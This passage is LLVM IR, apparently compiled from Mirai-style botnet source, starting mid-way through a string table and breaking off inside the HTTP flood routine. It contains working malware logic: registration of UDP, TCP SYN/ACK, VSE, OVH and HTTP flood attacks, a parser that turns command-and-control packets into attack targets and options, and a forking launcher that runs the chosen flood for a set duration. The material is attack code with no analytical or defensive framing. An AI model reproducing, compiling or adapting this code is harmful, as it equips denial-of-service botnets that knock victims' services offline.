0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16
@table = common local_unnamed_addr global [126 x %struct.table_value] zeroinitializer, align 16
@table_key = local_unnamed_addr global i32 -559038737, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() local_unnamed_addr #0 {
  tail call fastcc void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_vse)
  tail call fastcc void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_plain)
  tail call fastcc void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_syn)
  tail call fastcc void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_tcp_ack)
  tail call fastcc void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_app_http)
  tail call fastcc void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_stdhex)
  tail call fastcc void @add_attack(i8 zeroext 12, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* nonnull @attack_udp_ovhhex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) unnamed_addr #0 {
  %3 = tail call noalias i8* @calloc(i64 1, i64 16) #10
  %4 = getelementptr inbounds i8, i8* %3, i64 8
  store i8 %0, i8* %4, align 8
  %5 = bitcast i8* %3 to void (i8, %struct.attack_target*, i8, %struct.attack_option*)**
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %5, align 8
  %6 = load i8*, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %7 = load i8, i8* @methods_len, align 1
  %8 = zext i8 %7 to i64
  %9 = shl nuw nsw i64 %8, 3
  %10 = add nuw nsw i64 %9, 8
  %11 = tail call i8* @realloc(i8* %6, i64 %10) #10
  %12 = bitcast i8* %11 to %struct.attack_method**
  store i8* %11, i8** bitcast (%struct.attack_method*** @methods to i8**), align 8
  %13 = load i8, i8* @methods_len, align 1
  %14 = add i8 %13, 1
  store i8 %14, i8* @methods_len, align 1
  %15 = zext i8 %13 to i64
  %16 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %12, i64 %15
  %17 = bitcast %struct.attack_method** %16 to i8**
  store i8* %3, i8** %17, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias i8* @realloc(i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() local_unnamed_addr #0 {
  %1 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @kill(i32 %1, i32 9) #10
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 0), align 4
  %6 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %10, label %8

; <label>:8:                                      ; preds = %5
  %9 = tail call i32 @kill(i32 %6, i32 9) #10
  br label %10

; <label>:10:                                     ; preds = %8, %5
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 1), align 4
  %11 = load i32, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  %12 = icmp eq i32 %11, 0
  br i1 %12, label %15, label %13

; <label>:13:                                     ; preds = %10
  %14 = tail call i32 @kill(i32 %11, i32 9) #10
  br label %15

; <label>:15:                                     ; preds = %13, %10
  store i32 0, i32* getelementptr inbounds ([3 x i32], [3 x i32]* @attack_ongoing, i64 0, i64 2), align 4
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8* nocapture readonly, i32) local_unnamed_addr #0 {
  %3 = icmp ult i32 %1, 4
  br i1 %3, label %.thread80, label %4

; <label>:4:                                      ; preds = %2
  %5 = bitcast i8* %0 to i32*
  %6 = load i32, i32* %5, align 4
  %7 = tail call i32 @ntohl(i32 %6) #11
  %8 = icmp eq i32 %1, 4
  br i1 %8, label %.thread80, label %9

; <label>:9:                                      ; preds = %4
  %10 = getelementptr inbounds i8, i8* %0, i64 4
  %11 = load i8, i8* %10, align 1
  %12 = icmp eq i32 %1, 5
  br i1 %12, label %.thread80, label %13

; <label>:13:                                     ; preds = %9
  %14 = getelementptr inbounds i8, i8* %0, i64 5
  %15 = getelementptr inbounds i8, i8* %0, i64 6
  %16 = load i8, i8* %14, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp eq i8 %16, 0
  br i1 %18, label %.thread80, label %19

; <label>:19:                                     ; preds = %13
  %20 = add i32 %1, -6
  %21 = sext i32 %20 to i64
  %22 = zext i8 %16 to i64
  %23 = mul nuw nsw i64 %22, 5
  %24 = icmp ult i64 %21, %23
  br i1 %24, label %.thread80, label %.lr.ph88.preheader

.lr.ph88.preheader:                               ; preds = %19
  %25 = tail call noalias i8* @calloc(i64 %22, i64 24) #10
  %26 = bitcast i8* %25 to %struct.attack_target*
  %27 = add nsw i32 %17, -1
  %28 = zext i32 %27 to i64
  %29 = mul nuw nsw i64 %28, 5
  %30 = add nuw nsw i64 %29, 11
  %scevgep = getelementptr i8, i8* %0, i64 %30
  %wide.trip.count = zext i8 %16 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph88.prol.loopexit, label %.lr.ph88.prol.preheader

.lr.ph88.prol.preheader:                          ; preds = %.lr.ph88.preheader
  br label %.lr.ph88.prol

.lr.ph88.prol:                                    ; preds = %.lr.ph88.prol.preheader
  %31 = bitcast i8* %15 to i32*
  %32 = load i32, i32* %31, align 4
  %33 = getelementptr inbounds i8, i8* %25, i64 16
  %34 = bitcast i8* %33 to i32*
  store i32 %32, i32* %34, align 4
  %35 = getelementptr inbounds i8, i8* %0, i64 10
  %36 = getelementptr inbounds i8, i8* %0, i64 11
  %37 = load i8, i8* %35, align 1
  %38 = getelementptr inbounds i8, i8* %25, i64 20
  store i8 %37, i8* %38, align 4
  %39 = bitcast i8* %25 to i16*
  store i16 2, i16* %39, align 4
  %40 = load i32, i32* %34, align 4
  %41 = getelementptr inbounds i8, i8* %25, i64 4
  %42 = bitcast i8* %41 to i32*
  store i32 %40, i32* %42, align 4
  br label %.lr.ph88.prol.loopexit

.lr.ph88.prol.loopexit:                           ; preds = %.lr.ph88.preheader, %.lr.ph88.prol
  %indvars.iv91.unr = phi i64 [ 0, %.lr.ph88.preheader ], [ 1, %.lr.ph88.prol ]
  %.087.unr = phi i8* [ %15, %.lr.ph88.preheader ], [ %36, %.lr.ph88.prol ]
  %43 = icmp eq i8 %16, 1
  br i1 %43, label %._crit_edge, label %.lr.ph88.preheader.new

.lr.ph88.preheader.new:                           ; preds = %.lr.ph88.prol.loopexit
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88, %.lr.ph88.preheader.new
  %indvars.iv91 = phi i64 [ %indvars.iv91.unr, %.lr.ph88.preheader.new ], [ %indvars.iv.next92.1, %.lr.ph88 ]
  %.087 = phi i8* [ %.087.unr, %.lr.ph88.preheader.new ], [ %58, %.lr.ph88 ]
  %44 = bitcast i8* %.087 to i32*
  %45 = load i32, i32* %44, align 4
  %46 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 1
  store i32 %45, i32* %46, align 4
  %47 = getelementptr inbounds i8, i8* %.087, i64 4
  %48 = getelementptr inbounds i8, i8* %.087, i64 5
  %49 = load i8, i8* %47, align 1
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 2
  store i8 %49, i8* %50, align 4
  %51 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load i32, i32* %46, align 4
  %53 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv91, i32 0, i32 2, i32 0
  store i32 %52, i32* %53, align 4
  %indvars.iv.next92 = add nuw nsw i64 %indvars.iv91, 1
  %54 = bitcast i8* %48 to i32*
  %55 = load i32, i32* %54, align 4
  %56 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 1
  store i32 %55, i32* %56, align 4
  %57 = getelementptr inbounds i8, i8* %.087, i64 9
  %58 = getelementptr inbounds i8, i8* %.087, i64 10
  %59 = load i8, i8* %57, align 1
  %60 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 2
  store i8 %59, i8* %60, align 4
  %61 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 0
  store i16 2, i16* %61, align 4
  %62 = load i32, i32* %56, align 4
  %63 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %26, i64 %indvars.iv.next92, i32 0, i32 2, i32 0
  store i32 %62, i32* %63, align 4
  %indvars.iv.next92.1 = add nsw i64 %indvars.iv91, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next92.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.unr-lcssa, label %.lr.ph88

._crit_edge.unr-lcssa:                            ; preds = %.lr.ph88
  br label %._crit_edge

._crit_edge:                                      ; preds = %.lr.ph88.prol.loopexit, %._crit_edge.unr-lcssa
  %64 = add i32 %1, -6
  %65 = mul nsw i32 %17, -5
  %66 = add i32 %64, %65
  %67 = icmp eq i32 %66, 0
  br i1 %67, label %.loopexit81.thread, label %68

; <label>:68:                                     ; preds = %._crit_edge
  %69 = load i8, i8* %scevgep, align 1
  %70 = icmp eq i8 %69, 0
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %68
  %71 = zext i8 %69 to i64
  %72 = tail call noalias i8* @calloc(i64 %71, i64 16) #10
  %73 = bitcast i8* %72 to %struct.attack_option*
  %74 = getelementptr inbounds i8, i8* %scevgep, i64 1
  %75 = add i32 %66, -1
  %76 = zext i8 %69 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %89
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %89 ]
  %.184 = phi i8* [ %74, %.lr.ph.preheader ], [ %95, %89 ]
  %.17583 = phi i32 [ %75, %.lr.ph.preheader ], [ %96, %89 ]
  %77 = icmp eq i32 %.17583, 0
  br i1 %77, label %.loopexit81.loopexit, label %78

; <label>:78:                                     ; preds = %.lr.ph
  %79 = load i8, i8* %.184, align 1
  %80 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 1
  store i8 %79, i8* %80, align 8
  %81 = icmp eq i32 %.17583, 1
  br i1 %81, label %.loopexit81.loopexit, label %82

; <label>:82:                                     ; preds = %78
  %83 = getelementptr inbounds i8, i8* %.184, i64 1
  %84 = getelementptr inbounds i8, i8* %.184, i64 2
  %85 = load i8, i8* %83, align 1
  %86 = add i32 %.17583, -2
  %87 = zext i8 %85 to i32
  %88 = icmp slt i32 %86, %87
  br i1 %88, label %.loopexit81.loopexit, label %89

; <label>:89:                                     ; preds = %82
  %90 = add nuw nsw i32 %87, 1
  %91 = zext i32 %90 to i64
  %92 = tail call noalias i8* @calloc(i64 %91, i64 1) #10
  %93 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %73, i64 %indvars.iv, i32 0
  store i8* %92, i8** %93, align 8
  tail call void @util_memcpy(i8* %92, i8* %84, i32 %87)
  %94 = zext i8 %85 to i64
  %95 = getelementptr inbounds i8, i8* %84, i64 %94
  %96 = sub nsw i32 %86, %87
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %97 = icmp slt i64 %indvars.iv.next, %76
  br i1 %97, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %89
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %68
  %.070 = phi %struct.attack_option* [ null, %68 ], [ %73, %.loopexit.loopexit ]
  %98 = tail call i32* @__errno_location() #11
  store i32 0, i32* %98, align 4
  tail call void @attack_start(i32 %7, i8 zeroext %11, i8 zeroext %16, %struct.attack_target* %26, i8 zeroext %69, %struct.attack_option* %.070)
  br label %.loopexit81

.loopexit81.loopexit:                             ; preds = %.lr.ph, %78, %82
  br label %.loopexit81

.loopexit81:                                      ; preds = %.loopexit81.loopexit, %.loopexit
  %.171 = phi %struct.attack_option* [ %.070, %.loopexit ], [ %73, %.loopexit81.loopexit ]
  %99 = icmp eq i8* %25, null
  br i1 %99, label %100, label %.loopexit81.thread

.loopexit81.thread:                               ; preds = %._crit_edge, %.loopexit81
  %.17195 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ null, %._crit_edge ]
  %.07393 = phi i8 [ %69, %.loopexit81 ], [ undef, %._crit_edge ]
  tail call void @free(i8* nonnull %25) #10
  br label %100

; <label>:100:                                    ; preds = %.loopexit81, %.loopexit81.thread
  %.17196 = phi %struct.attack_option* [ %.171, %.loopexit81 ], [ %.17195, %.loopexit81.thread ]
  %.07394 = phi i8 [ %69, %.loopexit81 ], [ %.07393, %.loopexit81.thread ]
  %101 = icmp eq %struct.attack_option* %.17196, null
  br i1 %101, label %.thread80, label %102

; <label>:102:                                    ; preds = %100
  %103 = zext i8 %.07394 to i32
  tail call fastcc void @free_opts(%struct.attack_option* nonnull %.17196, i32 %103)
  br label %.thread80

.thread80:                                        ; preds = %2, %4, %9, %13, %19, %100, %102
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) local_unnamed_addr #0 {
  %7 = tail call i32 @fork() #10
  %8 = icmp eq i32 %7, -1
  %9 = icmp sgt i32 %7, 0
  %or.cond = or i1 %8, %9
  br i1 %or.cond, label %10, label %11

; <label>:10:                                     ; preds = %6
  ret void

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @fork() #10
  switch i32 %12, label %.preheader [
    i32 -1, label %18
    i32 0, label %19
  ]

.preheader:                                       ; preds = %11
  %13 = load i8, i8* @methods_len, align 1
  %14 = icmp eq i8 %13, 0
  br i1 %14, label %.loopexit, label %.lr.ph

.lr.ph:                                           ; preds = %.preheader
  %15 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i64
  br label %25

; <label>:18:                                     ; preds = %11
  tail call void @exit(i32 0) #12
  unreachable

; <label>:19:                                     ; preds = %11
  %20 = tail call i32 @sleep(i32 %0) #10
  %21 = tail call i32 @getppid() #10
  %22 = tail call i32 @kill(i32 %21, i32 9) #10
  tail call void @exit(i32 0) #12
  unreachable

; <label>:23:                                     ; preds = %25
  %24 = icmp slt i64 %indvars.iv.next, %17
  br i1 %24, label %25, label %.loopexit.loopexit

; <label>:25:                                     ; preds = %.lr.ph, %23
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %23 ]
  %26 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %15, i64 %indvars.iv
  %27 = load %struct.attack_method*, %struct.attack_method** %26, align 8
  %28 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 1
  %29 = load i8, i8* %28, align 8
  %30 = icmp eq i8 %29, %1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %30, label %31, label %23

; <label>:31:                                     ; preds = %25
  %32 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %27, i64 0, i32 0
  %33 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %32, align 8
  tail call void %33(i8 zeroext %2, %struct.attack_target* %3, i8 zeroext %4, %struct.attack_option* %5) #10
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %23
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %31
  tail call void @exit(i32 0) #12
  unreachable
}

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @free_opts(%struct.attack_option*, i32) unnamed_addr #0 {
  %3 = icmp eq %struct.attack_option* %0, null
  br i1 %3, label %11, label %.preheader

.preheader:                                       ; preds = %2
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %9
  %indvars.iv = phi i64 [ %indvars.iv.next, %9 ], [ 0, %.lr.ph.preheader ]
  %5 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %0, i64 %indvars.iv, i32 0
  %6 = load i8*, i8** %5, align 8
  %7 = icmp eq i8* %6, null
  br i1 %7, label %9, label %8

; <label>:8:                                      ; preds = %.lr.ph
  tail call void @free(i8* nonnull %6) #10
  br label %9

; <label>:9:                                      ; preds = %.lr.ph, %8
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %9
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %10 = bitcast %struct.attack_option* %0 to i8*
  tail call void @free(i8* %10) #10
  br label %11

; <label>:11:                                     ; preds = %2, %._crit_edge
  ret void
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #3

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getppid() local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i8* @attack_get_opt_str(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i8* readnone) local_unnamed_addr #5 {
  %5 = icmp eq i8 %0, 0
  br i1 %5, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %4
  %6 = zext i8 %0 to i64
  br label %.lr.ph

; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp slt i64 %indvars.iv.next, %6
  br i1 %8, label %.lr.ph, label %.loopexit.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %7
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %7 ]
  %9 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 1
  %10 = load i8, i8* %9, align 8
  %11 = icmp eq i8 %10, %2
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  br i1 %11, label %12, label %7

; <label>:12:                                     ; preds = %.lr.ph
  %13 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %1, i64 %indvars.iv, i32 0
  %14 = load i8*, i8** %13, align 8
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %7
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %12
  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #5 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10)
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_app_http(i8 zeroext, %struct.attack_target* nocapture readonly, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca [10241 x i8], align 16
  %7 = alloca %struct.fd_set, align 8
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca [10240 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 21, i8* null)
  %15 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0))
  %16 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %17 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 24, i32 1)
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 80)
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %21, i8 0, i64 10241, i32 16, i1 false)
  %22 = icmp eq i8* %16, null
  %23 = icmp eq i8* %17, null
  %or.cond = or i1 %22, %23
  br i1 %or.cond, label %996, label %24

; <label>:24:                                     ; preds = %4
  %25 = tail call i32 @util_strlen(i8* %17)
  %26 = icmp sgt i32 %25, 255
  br i1 %26, label %996, label %27

; <label>:27:                                     ; preds = %24
  %28 = tail call i32 @util_strlen(i8* %16)
  %29 = icmp sgt i32 %28, 127
  br i1 %29, label %996, label %30

; <label>:30:                                     ; preds = %27
  %31 = tail call i32 @util_strlen(i8* %15)
  %32 = icmp sgt i32 %31, 9
  br i1 %32, label %996, label %.preheader623

.preheader623:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %33 = tail call i32 @util_strlen(i8* %15)
  %34 = icmp sgt i32 %33, 0
  br i1 %34, label %.lr.ph669.preheader, label %._crit_edge670

.lr.ph669.preheader:                              ; preds = %.preheader623
  br label %.lr.ph669

.lr.ph669:                                        ; preds = %.lr.ph669.preheader, %41
  %storemerge668 = phi i32 [ %43, %41 ], [ 0, %.lr.ph669.preheader ]
  %35 = sext i32 %storemerge668 to i64
